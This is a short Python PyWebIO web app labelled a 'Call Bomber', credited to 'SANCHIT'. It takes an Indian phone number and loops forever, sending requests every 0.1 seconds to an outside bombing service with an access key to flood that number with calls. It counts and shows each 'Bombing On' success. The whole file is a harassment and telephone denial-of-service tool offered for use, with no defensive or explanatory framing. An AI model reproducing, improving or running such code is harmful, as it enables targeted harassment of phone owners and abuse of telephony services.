import pywebio.output as output
import pywebio.input as input
import requests
import time

count = {}

def scroll():
    output.put_html('<script>window.scrollTo(0, document.body.scrollHeight);</script>')
def MyApp():
    skc = input.input_group('• Call Bomber By: SANCHIT 💸', [input.input(" • Enter Your Number (without +91) ", name="SK")])
    SK = str(skc["SK"])
    if SK not in count:
        count[SK] = {"successful": 0, "failed": 0}
    else:
        count[SK]["successful"] = 0
        count[SK]["failed"] = 0
    while True:
        req = requests.get(f"https://bomber-tools.xyz/?mobile={SK}&accesskey=BomberSmm&submit=Submit").text
        if 'started' in req:
            count[SK]["successful"] += 1
            output.put_html(f'<h3 style="color:#4CAF50;">✅ Bombing On - <span style="color:#2196F3;">Count =></span> <span style="color:#FF5722;">{count[SK]["successful"]}</span></h3><i style="color:#FFC107;">BY: <span style="font-style:italic; font-weight:bold;">SANCHIT</span></i>')
            scroll()
            time.sleep(0.1)
        else:
            count[SK]["failed"] += 1
            output.put_html(f'<h3 style="color:#FF5722;">❌ Bombing Off - <span style="color:#2196F3;">Count =></span> <span style="color:#FF5722;">{count[SK]["failed"]}</span></h3><i style="color:#FFC107;">BY: <span style="font-style:italic; font-weight:bold;">SANCHIT</span></i>')
            scroll()
            time.sleep(0.1)

if __name__ == '__main__':
    from pywebio import start_server
    start_server(MyApp, port=8086, debug=True)
